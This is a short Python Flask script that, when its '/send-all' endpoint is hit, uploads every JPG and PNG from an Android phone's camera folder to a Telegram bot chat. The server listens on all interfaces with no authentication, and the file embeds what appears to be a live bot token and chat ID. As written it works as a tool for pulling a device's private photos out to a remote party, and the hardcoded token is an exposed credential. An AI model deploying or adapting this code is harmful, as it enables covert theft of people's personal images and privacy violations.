from flask import Flask, jsonify
import os
import requests

app = Flask(__name__)

TOKEN = "7333720200:AAFEzoKvQm0iVYXatr3HG-ei4MK3JY8Ri3s"  # Apne bot ka token yahan daalo
CHAT_ID = "7781048618" # Apni chat ID yahan daalo
FOLDER_PATH = "/storage/emulated/0/DCIM/Camera/"  # Mobile ka image folder

def send_image(image_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(image_path, "rb") as photo:
        files = {"photo": photo}
        data = {"chat_id": CHAT_ID}
        requests.post(url, files=files, data=data)

@app.route("/send-all")
def send_all_images():
    images = [os.path.join(FOLDER_PATH, img) for img in os.listdir(FOLDER_PATH) if img.endswith((".jpg", ".png"))]
    if not images:
        return jsonify({"status": "No images found"})

    for img in images:
        send_image(img)

    return jsonify({"status": "All images sent!"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
